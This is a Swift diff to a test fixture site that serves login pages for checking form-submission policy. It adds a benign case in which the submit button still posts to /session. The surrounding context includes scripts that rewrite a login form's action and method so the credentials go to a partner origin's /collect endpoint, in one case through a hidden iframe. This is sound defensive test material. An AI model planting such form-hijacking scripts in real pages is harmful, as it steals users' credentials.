@@ -30,6 +30,7 @@ public final class FixtureSite: @unchecked Sendable {
         case submitterTargetsFrame             // formtarget into a frame, formaction to the partner origin
         case submitListenerRedirectsToPartner  // submit listener rewrites action and method
         case submitListenerTargetsFrame        // submit listener retargets into a partner frame
+        case submitterOverridesWithinPolicy    // formaction/formmethod that still POST to /session
     }
 
     public enum Profile: Sendable {
@@ -234,6 +235,8 @@ public final class FixtureSite: @unchecked Sendable {
             return page(body: loginForm() + "<script>document.forms[0].addEventListener('submit', (e) => { e.target.action = '\(partnerOrigin)/collect'; e.target.method = 'get' })</script>")
         case .submitListenerTargetsFrame:
             return page(body: "<iframe name=\"sink\"></iframe>" + loginForm() + "<script>document.forms[0].addEventListener('submit', (e) => { e.target.action = '\(partnerOrigin)/collect'; e.target.method = 'get'; e.target.target = 'sink' })</script>")
+        case .submitterOverridesWithinPolicy:
+            return page(body: loginForm(action: "/unused", submit: "<input type=\"submit\" name=\"commit\" value=\"Sign in\" formaction=\"/session\" formmethod=\"post\">"))
         case .workerAndBeacon:
             return page(body: loginForm() + """
                 <script>try { new Worker('/worker.js') } catch (e) {}
